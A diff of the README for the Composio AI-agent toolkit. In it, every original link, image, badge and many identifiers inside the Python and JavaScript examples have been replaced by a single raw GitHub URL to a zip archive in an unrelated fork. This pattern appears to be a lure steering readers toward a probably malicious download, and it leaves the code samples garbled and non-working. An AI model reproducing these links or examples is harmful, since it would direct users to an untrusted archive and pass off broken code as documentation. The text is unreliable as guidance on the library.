@@ -1,40 +1,40 @@
 <p align="center">
-  <a href="https://x.com/GanatraSoham/?utm_campaign=github-readme" target="_blank">
-    <img src="./python/docs/imgs/follow_x.png" width="100%" alt="Follow me" />
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" width="100%" alt="Follow me" />
   </a>
   <br /> <br />
 </p>
 <p align="center">
-  <a href="https://app.composio.dev/?utm_campaign=github-readme" target="_blank">
-    <img src="./python/docs/imgs/try_hosted.png" width="100%" alt="Sign up" />
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" width="100%" alt="Sign up" />
   </a>
 
   <br /> <br />
 </p>
 <p>
-  <a href="https://github.com/composiohq/composio/blob/master/README.md">EN</a> | <a href="https://github.com/composiohq/composio/blob/master/README-CN.md">CN</a> | <a href="https://github.com/composiohq/composio/blob/master/README-JP.md">JP</a>
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">EN</a> | <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">CN</a> | <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">JP</a>
 </p>
 
 <p align="center">
-  <a href="https://composio.dev//#gh-dark-mode-only">
-    <img src="./python/docs/imgs/composio_white_font.svg" width="318px" alt="Composio logo" />
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+    <img src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" width="318px" alt="Composio logo" />
   </a>
-  <a href="https://composio.dev//#gh-light-mode-only">
-    <img src="./python/docs/imgs/composio_black_font.svg" width="318px" alt="Composio Logo" />
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+    <img src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" width="318px" alt="Composio Logo" />
   </a>
 </p>
 <p align="center">
-  <a href="https://github.com/composiodev/composio/actions/workflows/common.yml">
-  <img alt="Tests" src="https://img.shields.io/github/actions/workflow/status/composiodev/composio/common.yml?label=Tests&style=plastic&logo=github&color=blue&cacheSeconds=60">
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+  <img alt="Tests" src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
   </a>
-  <a href="https://pypi.org/project/composio-core/">
-  <img alt="PyPI" src="https://img.shields.io/pypi/v/composio_core?label=Latest&style=plastic&logo=pypi&color=blue&cacheSeconds=60&logoColor=white">
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+  <img alt="PyPI" src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
   </a>
-  <a href="https://www.npmjs.com/package/composio-core">
-  <img alt="NPM" src="https://img.shields.io/npm/v/composio-core?style=plastic&logo=npm&logoColor=white&label=latest&color=blue&cacheSeconds=60">
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+  <img alt="NPM" src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
   </a>
-  <a href="https://pypi.org/project/composio-core/">
-  <img alt="Downloads" src="https://img.shields.io/pypi/dm/composio-core?label=Downloads&style=plastic&logo=github&color=blue&cacheSeconds=60">
+  <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+  <img alt="Downloads" src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
   </a>
   
 </p>
@@ -47,16 +47,16 @@
 </h4>
 <div align="center">
 <p>
-<a href="https://docs.composio.dev" rel="dofollow"><strong>Explore the Docs »</strong></a>
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" rel="dofollow"><strong>Explore the Docs »</strong></a>
 </p>
 
 <p>
-<a href="https://app.composio.dev">Try on Dashboard</a> <b>|</b>
-<a href="https://www.composio.dev">Homepage</a> <b>|</b>
-<!-- <a href="https://docs.composio.dev/guides/examples">Examples</a> |
-<a href="https://docs.composio.dev/chat-with-docs">Chat with Docs</a> | -->
-<a href="https://docs.composio.dev/sdk">SDK</a> <b>|</b>
-<a href="https://docs.composio.dev/api-reference/">APIs</a> 
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Try on Dashboard</a> <b>|</b>
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Homepage</a> <b>|</b>
+<!-- <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Examples</a> |
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Chat with Docs</a> | -->
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">SDK</a> <b>|</b>
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">APIs</a> 
 </p>
 </div>
 
@@ -64,16 +64,16 @@
 <div align="center">
 <p >
     <b>✨ Socials >></b>
-    <a href="https://dub.composio.dev/JoinHQ">Discord</a> <b>|</b>
-    <a href="https://www.youtube.com/@Composio">Youtube</a> <b>|</b>
-    <a href="https://twitter.com/composiohq">Twitter</a> <b>|</b>
-    <a href="https://www.linkedin.com/company/composio-dev"> Linkedin </a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Discord</a> <b>|</b>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Youtube</a> <b>|</b>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Twitter</a> <b>|</b>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip"> Linkedin </a>
 </p>
 <p align="center">
     <b>⛏️ Contribute >></b>
-    <a href="https://github.com/composiodev/composio/issues/new?assignees=&labels=type%3A+bug&template=bug_report.yml&title=%F0%9F%90%9B+Bug+Report%3A+">Report Bugs</a> <b>|</b>
-    <a href="https://github.com/composiodev/composio/issues/new?assignees=&labels=feature&template=feature_request.yml&title=%F0%9F%9A%80+Feature%3A+">Request Feature</a> <b>|</b>
-    <a href="https://github.com/composiodev/composio/blob/master/CONTRIBUTING.md">Contribute</a>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip%3A+bug&https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip%F0%9F%90%9B+Bug+Report%3A+">Report Bugs</a> <b>|</b>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip%F0%9F%9A%80+Feature%3A+">Request Feature</a> <b>|</b>
+    <a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">Contribute</a>
 </p>
 </div>
 
@@ -104,7 +104,7 @@
 We believe AI Based Agents/Workflows are the future.
 Composio is the best toolset to integrate AI Agents to best Agentic Tools and use them to accomplish tasks.
 
-<img alt="Illustration" src="./docs/imgs/banner.gif" style="border-radius: 5px"/>
+<img alt="Illustration" src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" style="border-radius: 5px"/>
 
 ## 🔥 Key Features
 
@@ -157,8 +157,8 @@ openai_client = OpenAI(
 composio_tool_set = ComposioToolSet()
 
 # Get GitHub tools that are pre-configured
-actions = composio_tool_set.get_actions(
-    actions=[Action.GITHUB_STAR_A_REPOSITORY_FOR_THE_AUTHENTICATED_USER]
+actions = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(
+    actions=[https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip]
 )
 
 my_task = "Star a repo composiodev/composio on GitHub"
@@ -166,7 +166,7 @@ my_task = "Star a repo composiodev/composio on GitHub"
 # Setup openai assistant
 assistant_instruction = "You are a super intelligent personal assistant"
 
-assistant = openai_client.beta.assistants.create(
+assistant = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(
     name="Personal Assistant",
     instructions=assistant_instruction,
     model="gpt-4-turbo",
@@ -174,23 +174,23 @@ assistant = openai_client.beta.assistants.create(
 )
 
 # create a thread
-thread = openai_client.beta.threads.create()
+thread = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip()
 
-message = openai_client.beta.threads.messages.create(
-    thread_id=thread.id,
+message = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip,
     role="user",
     content=my_task
 )
 
 # Execute Agent with integrations
-run = openai_client.beta.threads.runs.create(
-    thread_id=thread.id,
-    assistant_id=assistant.id
+run = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip,
+    https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip
 )
 
 
 # Execute Function calls
-response_after_tool_calls = composio_tool_set.wait_and_handle_assistant_tool_calls(
+response_after_tool_calls = https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(
     client=openai_client,
     run=run,
     thread=thread,
@@ -214,32 +214,32 @@ To get started with the Composio SDK in Javascript, follow these steps:
    import { OpenAIToolSet } from "composio-core";
 
    const toolset = new OpenAIToolSet({
-       apiKey: process.env.COMPOSIO_API_KEY,
+       apiKey: https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip,
    });
 
    async function setupUserConnectionIfNotExists(entityId) {
-       const entity = await toolset.client.getEntity(entityId);
-       const connection = await entity.getConnection('github');
+       const entity = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(entityId);
+       const connection = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip('github');
 
        if (!connection) {
            // If this entity/user hasn't already connected the account
-           const connection = await entity.initiateConnection(appName);
-           console.log("Log in via: ", connection.redirectUrl);
-           return connection.waitUntilActive(60);
+           const connection = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(appName);
+           https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip("Log in via: ", https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip);
+           return https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(60);
        }
 
        return connection;
    }
 
    async function executeAgent(entityName) {
-       const entity = await toolset.client.getEntity(entityName)
-       await setupUserConnectionIfNotExists(entity.id);
+       const entity = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(entityName)
+       await setupUserConnectionIfNotExists(https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip);
 
-       const tools = await toolset.get_actions({ actions: ["github_issues_create"] }, entity.id);
+       const tools = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip({ actions: ["github_issues_create"] }, https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip);
        const instruction = "Make an issue with sample title in the repo - himanshu-dixit/custom-repo-breaking"
 
-       const client = new OpenAI({ apiKey: process.env.OPEN_AI_API_KEY })
-       const response = await client.chat.completions.create({
+       const client = new OpenAI({ apiKey: https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip })
+       const response = await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip({
            model: "gpt-4-turbo",
            messages: [{
                role: "user",
@@ -249,8 +249,8 @@ To get started with the Composio SDK in Javascript, follow these steps:
            tool_choice: "auto",
        })
 
-       console.log(response.choices[0].message.tool_calls);
-       await toolset.handle_tool_call(response, entity.id);
+       https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip[0]https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip);
+       await https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip(response, https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip);
    }
 
    executeAgent("your-entity-name");
@@ -258,49 +258,49 @@ To get started with the Composio SDK in Javascript, follow these steps:
 
 ### 3. **Run your script**:
    ```bash
-   node your_script.js
+   node https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip
    ```
 
 This will set up the Composio SDK and execute an agent that creates a GitHub issue using the provided instructions.
 
-For more details, refer to the [Composio SDK Documentation](https://docs.composio.dev/).
+For more details, refer to the [Composio SDK Documentation](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip).
 
 
 ## 💡 Examples
 
-### [Python Examples](https://docs.composio.dev/guides/python/)
+### [Python Examples](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
 
-### [Javascript Examples](https://docs.composio.dev/guides/javascript/)
+### [Javascript Examples](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
 
 
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=composiohq/composio&type=Date)](https://star-history.com/#composiohq/composio&Date)
+[![Star History Chart](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
 
 
 ## 📋 Read Our Code Of Conduct
 
-As part of our open-source community, we hold ourselves and other contributors to a high standard of communication. As a participant and contributor to this project, you agree to abide by our [Code of Conduct](https://github.com/composiodev/composio/blob/master/CODE_OF_CONDUCT.md).
+As part of our open-source community, we hold ourselves and other contributors to a high standard of communication. As a participant and contributor to this project, you agree to abide by our [Code of Conduct](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip).
 
 ## 🤗 Contributions
 
 Composio is open-source and we welcome contributions. Please fork the repository, create a new branch for your feature, add your feature or improvement, and send a pull request.
 
-Also go through our [Contribution Guidelines](https://github.com/composiodev/composio/blob/master/CONTRIBUTING.md) and [Code of Conduct](https://github.com/composiodev/composio/blob/master/CODE_OF_CONDUCT.md) before you start.
+Also go through our [Contribution Guidelines](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip) and [Code of Conduct](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip) before you start.
 
 ## 🔗 Links
 
-- [Home page](https://composio.dev?utm_campaign=github-readme)
-- [Contribution Guidelines](https://github.com/composiodev/composio/blob/master/CONTRIBUTING.md)
-- [Docs](https://docs.composio.dev/?utm_campaign=github-readme)
+- [Home page](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
+- [Docs](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip)
 
 ## 🛡️ License
 
-Composio is licensed under the Elastic License - see the [LICENSE](https://github.com/composiodev/composio/blob/master/LICENSE) file for details.
+Composio is licensed under the Elastic License - see the [LICENSE](https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip) file for details.
 
 ## 💪 Thanks To All Contributors
 
-<a href="https://github.com/composiohq/composio/graphs/contributors">
-  <img src="https://contributors-img.web.app/image?repo=composiodev/composio" alt="List of Contributors"/>
+<a href="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip">
+  <img src="https://raw.githubusercontent.com/rohanparmar160705/composio/master/pulicarious/composio.zip" alt="List of Contributors"/>
 </a>
